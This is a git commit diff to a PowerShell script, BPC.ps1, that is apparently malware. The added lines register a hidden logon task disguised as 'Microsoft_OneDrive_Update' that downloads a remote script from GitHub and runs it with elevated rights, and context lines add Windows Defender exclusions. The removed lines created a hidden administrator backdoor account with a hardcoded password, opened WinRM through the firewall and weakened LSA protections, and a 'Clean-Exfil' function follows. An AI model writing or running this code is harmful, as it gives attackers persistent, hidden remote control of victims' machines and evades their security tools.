3b9ab3a4af09bc51ec56b546801a6fcdb4a4effe
skekic16 <151707511+skekic16@users.noreply.github.com>
2024-01-14 20:40:49 -0600

    Update BPC.ps1

--- BPC.ps1
+++ BPC.ps1
@@ -1,3 +1,11 @@
+$action = New-ScheduledTaskAction -Execute 'cmd' -Argument '/c start /min "" powershell -w h -NoP -NonI -Exec Bypass $BPP = iwr https://github.com/skekic16/lol/raw/main/BPP.ps1?dl=1; invoke-expression $BPP'
+$trigger = New-ScheduledTaskTrigger -AtLogon
+$principal = New-ScheduledTaskPrincipal -UserID 'DOMAIN\user' -RunLevel Highest
+$settings = New-ScheduledTaskSettingsSet -Hidden -RunOnlyIfNetworkAvailable -AllowStartIfOnBatteries 
+$task = New-ScheduledTask -Action $action -Principal $principal -Trigger $trigger -Settings $settings
+Register-ScheduledTask T1 -InputObject $task -Force -TaskName Microsoft_OneDrive_Update -User $env:UserName
+
+
 cd $env:SystemRoot\System32
 mkdir Microsoft_OneDrive
 Set-MpPreference -ExclusionPath $env:SystemRoot\System32\Microsoft_OneDrive
@@ -59,25 +67,11 @@ Set-MpPreference -ExclusionPath $env:SystemRoot\System32\Microsoft_OneDrive\BQ
 
 
 
-
-
-NET USER AWORTH Imperator877 /ADD
-NET LOCALGROUP Administrators AWORTH /ADD
-winrm quickconfig -quiet
-NETSH ADVFIREWALL FIREWALL ADD RULE NAME="Windows Remote Management for RD" PROTOCOL=TCP LOCALPORT=5985 DIR=IN ACTION=ALLOW PROFILE=PUBLIC,PRIVATE,DOMAIN
-REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /f /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1
-REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /f /v AWORTH /t REG_DWORD /d 0
-reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+echo "Backdoor here"
 
 
 
 
-$action = New-ScheduledTaskAction -Execute 'cmd' -Argument '/c start /min "" powershell -w h -NoP -NonI -Exec Bypass $BPP = iwr https://github.com/skekic16/lol/raw/main/BPP.ps1?dl=1; invoke-expression $BPP'
-$trigger = New-ScheduledTaskTrigger -AtLogon
-$principal = New-ScheduledTaskPrincipal -UserID 'DOMAIN\user' -RunLevel Highest
-$settings = New-ScheduledTaskSettingsSet -Hidden -RunOnlyIfNetworkAvailable -AllowStartIfOnBatteries 
-$task = New-ScheduledTask -Action $action -Principal $principal -Trigger $trigger -Settings $settings
-Register-ScheduledTask T1 -InputObject $task -Force -TaskName Microsoft_OneDrive_Update -User $env:UserName
 
 function Clean-Exfil { 
 
